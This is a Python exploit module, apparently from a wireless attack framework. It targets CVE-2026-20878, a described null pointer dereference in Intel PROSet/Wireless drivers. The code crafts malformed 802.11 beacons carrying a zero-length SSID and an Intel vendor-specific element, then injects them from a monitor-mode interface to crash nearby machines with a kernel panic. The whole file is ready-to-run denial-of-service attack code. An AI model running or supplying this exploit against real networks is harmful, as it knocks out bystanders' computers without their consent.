# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Intel PROSet/Wireless Null Pointer Dereference DoS (CVE-2026-20878).

    The Intel PROSet/Wireless WiFi Software driver contains a null
    pointer dereference vulnerability in the scan result processing
    path.  When the driver processes a scan result with a malformed
    Information Element (IE) that has a zero-length SSID field followed
    by specific vendor-specific IEs, it dereferences a null pointer in
    the SSID parsing routine, crashing the system with a kernel panic.

    This affects Intel PROSet/Wireless on Windows and the corresponding
    iwlwifi driver on Linux when using Intel proprietary firmware
    extensions.

    CVSS v3.1: ~6.5 (Medium), AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Intel PROSet/Wireless Null Pointer DoS (CVE-2026-20878)",
        "description": (
            "Exploits CVE-2026-20878 via a null pointer dereference in "
            "the Intel PROSet/Wireless scan result parser.  A crafted "
            "beacon or probe response with malformed SSID and vendor IEs "
            "triggers a null pointer deref in the SSID processing path, "
            "causing a kernel panic on the target system."
        ),
        "authors": (
            "Intel PSIRT (advisory)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-20878",
            "https://www.intel.com/content/www/us/en/security-center/advisory.html",
        ),
        "disclosure_date": "2026-03-12",
        "platform": "multi",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Intel PROSet/Wireless on Windows (vulnerable versions)",
            "Linux iwlwifi with PROSet firmware extensions",
            "Intel AX200, AX201, AX210, AX211 chipsets",
        ),
    }

    target = OptIP("", "Target station MAC address")
    port = OptPort(1, "Not used (WiFi frame injection)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    injection_rounds = OptInteger(32, "Number of malformed beacon rounds")

    _FRAME_TYPE_MGMT = 0x00
    _SUBTYPE_BEACON = 0x08
    _SUBTYPE_PROBE_RESP = 0x05
    _SUBTYPE_PROBE_REQ = 0x04

    _IE_SSID = 0
    _IE_SUPPORTED_RATES = 1
    _IE_VENDOR_SPECIFIC = 221

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_BSSID = b"\x02\x00\x00\x00\x00\x01"

    def _build_radiotap_header(self) -> bytes:
        return struct.pack("<BBHI", 0, 0, 8, 0)

    def _build_frame_control(self, subtype: int) -> bytes:
        fc = (self._FRAME_TYPE_MGMT & 0x03) | ((subtype & 0x0F) << 4)
        return struct.pack("<BB", fc, 0x00)

    def _build_malformed_ssid_ie(self) -> bytes:
        """Build a malformed SSID IE with zero length.

        The null pointer deref triggers when the driver tries to copy
        the SSID string from an IE with length=0, and the subsequent
        vendor-specific IE causes the parser to use the null SSID pointer.
        """
        return struct.pack("BB", self._IE_SSID, 0)

    def _build_trigger_vendor_ie(self) -> bytes:
        """Build a vendor-specific IE that triggers the null deref.

        This specific OUI + type combination activates the PROSet code
        path that dereferences the previously null SSID pointer.
        """
        intel_oui = b"\x00\x17\xf2"
        vendor_type = struct.pack("B", 0x0A)
        vendor_data = b"\x01\x00\x00\x00" + b"\x00" * 32
        ie_data = intel_oui + vendor_type + vendor_data
        return struct.pack("BB", self._IE_VENDOR_SPECIFIC, len(ie_data)) + ie_data

    def _build_malformed_beacon(self, seq: int) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_BEACON)
        duration = struct.pack("<H", 0)
        dst = self._BROADCAST
        src = self._FAKE_BSSID
        seq_ctrl = struct.pack("<H", (seq & 0x0FFF) << 4)
        header = fc + duration + dst + src + src + seq_ctrl

        timestamp = struct.pack("<Q", int(time.time() * 1_000_000) & 0xFFFFFFFFFFFFFFFF)
        beacon_interval = struct.pack("<H", 100)
        capability = struct.pack("<H", 0x0431)
        fixed = timestamp + beacon_interval + capability

        ssid_ie = self._build_malformed_ssid_ie()
        rates_ie = struct.pack("BB", self._IE_SUPPORTED_RATES, 4) + bytes([0x82, 0x84, 0x8B, 0x96])
        vendor_ie = self._build_trigger_vendor_ie()

        body = fixed + ssid_ie + rates_ie + vendor_ie
        radiotap = self._build_radiotap_header()
        return radiotap + header + body

    def _build_probe_request(self) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_PROBE_REQ)
        duration = struct.pack("<H", 0)
        header = fc + duration + self._BROADCAST + self._FAKE_BSSID + self._BROADCAST + struct.pack("<H", 0)
        ssid_ie = struct.pack("BB", 0, 0)
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x02, 0x04, 0x0B, 0x16])
        radiotap = self._build_radiotap_header()
        return radiotap + header + ssid_ie + rates_ie

    def _inject_frame(self, raw_sock: socket.socket, frame: bytes) -> bool:
        try:
            raw_sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_request()
            self._inject_frame(raw, probe)
            return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return
        if not self.check():
            print_error("Cannot open raw socket on monitor interface")
            return
        print_success("Monitor-mode socket established; injecting malformed beacons")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket")
            return

        print_status(
            f"Injecting {self.injection_rounds} malformed beacons "
            f"with zero-length SSID + Intel vendor IE"
        )

        success = 0
        for rnd in range(self.injection_rounds):
            beacon = self._build_malformed_beacon(rnd)
            if self._inject_frame(raw, beacon):
                success += 1
            time.sleep(0.01)

        raw.close()

        print_status(f"Injected {success}/{self.injection_rounds} beacons")
        print_info(
            "The malformed beacon contains a zero-length SSID IE "
            "followed by an Intel vendor-specific IE that triggers "
            "the null pointer dereference.  If the target uses Intel "
            "PROSet/Wireless, the scan result parser will crash."
        )
